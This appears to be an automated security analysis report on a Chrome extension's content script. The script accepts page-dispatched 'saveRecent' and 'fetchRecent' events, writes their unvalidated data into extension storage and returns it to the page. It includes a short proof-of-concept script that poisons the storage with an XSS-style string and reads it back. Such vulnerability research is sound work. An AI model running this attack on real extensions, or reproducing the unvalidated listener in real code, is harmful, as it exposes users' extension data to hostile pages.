# CoCo Analysis: ccgjjclgjdmciiofkfmbgbmkdocamjdo

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cs_window_eventListener_saveRecent → chrome_storage_local_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ccgjjclgjdmciiofkfmbgbmkdocamjdo/opgen_generated_files/cs_0.js
Line 554 window.addEventListener("saveRecent", function (event) {
Line 557 var data = event.detail;

**Code:**

```javascript
// Content script (cs_0.js) - Entry point
window.addEventListener("saveRecent", function (event) { // Attacker can dispatch custom event
    var data = event.detail; // event.detail ← attacker-controlled

    chrome.storage.local.set({ recentTemp: data }).then(() => { // Storage write sink
        //console.log("data saved");
    });
});

// Retrieval path - attacker can read back the poisoned data
window.addEventListener("fetchRecent", function () {
    chrome.storage.local.get("recentTemp", function (result) {
        var data = result.recentTemp; // Read poisoned data
        if (data !== undefined && Array.isArray(data)) {
            let returnedEvent = new CustomEvent("sendRecent", { detail: data }); // ← attacker-controlled data
            window.dispatchEvent(returnedEvent); // Send back to attacker
        }
    });
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event

**Attack:**

```javascript
// Malicious webpage can poison extension storage
let maliciousPayload = ["<script>alert('XSS')</script>", "malicious-data"];
let saveEvent = new CustomEvent("saveRecent", { detail: maliciousPayload });
window.dispatchEvent(saveEvent);

// Attacker can then retrieve the poisoned data
window.addEventListener("sendRecent", function(event) {
    console.log("Stolen data:", event.detail); // Receives attacker-controlled data back
});

let fetchEvent = new CustomEvent("fetchRecent");
window.dispatchEvent(fetchEvent);
```

**Impact:** Complete storage exploitation chain - attacker can write arbitrary data to chrome.storage.local and retrieve it back. The content script runs on https://chat.openai.com/*, allowing OpenAI's website (or an attacker who compromises it) to poison extension storage and exfiltrate data. This creates a full read/write primitive for extension storage.
